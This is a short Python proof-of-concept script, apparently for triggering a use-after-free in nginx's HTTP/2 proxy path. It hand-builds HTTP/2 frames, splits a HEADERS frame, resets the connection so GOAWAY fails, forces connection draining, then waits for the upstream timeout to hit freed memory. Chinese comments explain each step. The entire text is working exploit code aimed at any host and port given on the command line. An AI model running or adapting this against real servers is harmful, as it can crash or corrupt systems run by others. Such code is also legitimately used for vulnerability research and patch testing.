import socket, struct, sys, time, threading

def fr(t, f, sid, p=b""):
    return struct.pack(">I", len(p))[1:] + bytes([t, f]) + struct.pack(">I", sid) + p
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
HP = bytes([0x82, 0x86, 0x44, 0x05]) + b"/slow" + bytes([0x41, 0x09]) + b"localhost"
HEADERS = fr(0x1, 0x5, 1, HP)

def conn(host, port, t=5):
    s = socket.create_connection((host, port), timeout=t)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.sendall(PREFACE + fr(0x4, 0, 0))
    return s

host, port = sys.argv[1], int(sys.argv[2])
fillers = []
for _ in range(3):
    fillers.append(conn(host, port))
time.sleep(0.4)
s = conn(host, port)
s.settimeout(0.2)
try:
    while True: s.recv(65535)
except Exception: pass
s.sendall(HEADERS[:1])
try:
    while True: s.recv(65535)
except Exception: pass
s.sendall(HEADERS[1:])              # stream -> upstream connect (SYN dropped, pending)
time.sleep(0.25)
s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
s.close()                            # RST，让 GOAWAY 写失败
try:
    t = conn(host, port)             # 触发 accept -> ngx_get_connection -> drain
    time.sleep(0.2)
    t.close()
except Exception:
    pass
print("triggered")
time.sleep(35)                       # 等 proxy_connect_timeout 到期，看上游代码是否踩已释放请求
for f in fillers:
    try: f.close()
    except Exception: pass
print("done")
